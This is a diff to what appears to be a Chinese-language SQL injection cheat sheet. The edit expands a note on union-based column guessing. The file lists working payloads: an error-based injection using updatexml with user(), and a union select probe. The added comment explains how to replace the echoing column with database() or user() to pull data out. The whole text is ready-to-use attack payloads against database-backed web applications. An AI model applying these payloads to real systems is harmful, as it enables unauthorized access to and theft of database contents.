@@ -1,2 +1,2 @@
 1'--+%0aand+updatexml(1,user(),1)='    报错注入
-1' union select 1,2,3,4,5#    联合注入猜列
+1' union select 1,2,3,4,5#    联合注入猜列，回显的列就为注入点，例如第二列回显，则就可以将2改为database(),user()等payload
